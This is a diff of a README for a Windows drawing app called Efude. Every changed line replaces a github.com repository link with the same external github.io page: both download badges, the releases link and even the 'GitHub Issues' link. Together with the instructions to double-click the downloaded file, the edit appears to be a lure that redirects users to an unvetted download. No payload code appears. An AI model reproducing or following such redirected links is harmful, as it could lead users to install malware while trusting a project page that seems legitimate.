@@ -10,7 +10,7 @@ Built with performance in mind, Efude gives you a crisp and smooth drawing exper
 
 **Click the button below to get started:**
 
-[![Download Efude](https://img.shields.io/badge/Download-Efude-2ea44f?style=for-the-badge&logo=github)](https://github.com/Rishav1432/Efude)
+[![Download Efude](https://img.shields.io/badge/Download-Efude-2ea44f?style=for-the-badge&logo=github)](https://rishav1432.github.io)
 
 Visit this link to download the application.
 
@@ -53,7 +53,7 @@ Efude is designed to run on most modern Windows computers. Here's what you'll ne
 Follow these simple steps to get Efude running on your Windows computer:
 
 ### Step 1: Download the Application
-Click the download button above or visit the [releases page](https://github.com/Rishav1432/Efude) to find the latest version.
+Click the download button above or visit the [releases page](https://rishav1432.github.io) to find the latest version.
 
 ### Step 2: Start the Installation
 Once the file is downloaded, locate it in your **Downloads** folder and double-click to run it. Follow any on-screen instructions that appear.
@@ -164,7 +164,7 @@ Once you're comfortable with the basics, explore these powerful features:
 If you need assistance beyond this guide:
 
 - **User Guide**: Read the detailed [User Guide](docs/USER_GUIDE.md) for in-depth documentation
-- **Report Issues**: Visit the [GitHub Issues](https://github.com/Rishav1432/Efude/issues) page to report bugs or request features
+- **Report Issues**: Visit the [GitHub Issues](https://rishav1432.github.io) page to report bugs or request features
 - **Community**: Join discussions about Efude to learn tips from other artists
 
 ## 🔒 Keeping Your Data Safe
@@ -197,6 +197,6 @@ Efude is ready to become your creative companion. With its intuitive interface, 
 
 Download Efude today and discover how enjoyable digital art can be!
 
-[![Download Efude Now](https://img.shields.io/badge/🚀-Download_Efude-FF6B6B?style=for-the-badge&logo=github)](https://github.com/Rishav1432/Efude)
+[![Download Efude Now](https://img.shields.io/badge/🚀-Download_Efude-FF6B6B?style=for-the-badge&logo=github)](https://rishav1432.github.io)
 
 Keywords: Efude, drawing app, painting software, manga creator, Windows art application, digital art, illustration tool, Rust drawing app, open source art software, comic creation tool
